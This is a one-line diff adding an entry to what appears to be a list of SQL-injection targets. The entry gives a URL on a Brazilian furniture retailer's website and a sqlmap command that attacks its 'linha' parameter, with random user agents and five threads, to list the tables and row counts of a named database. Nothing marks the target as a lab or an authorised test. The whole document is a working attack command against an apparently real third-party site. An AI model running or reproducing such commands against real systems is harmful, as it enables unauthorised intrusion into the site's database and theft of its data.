@@ -1,0 +1,1 @@
+https://www.laramoveis.com.br/linha.php?linha=97 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.laramoveis.com.br/linha.php?linha=97 -D laramove_2014 --tables --count
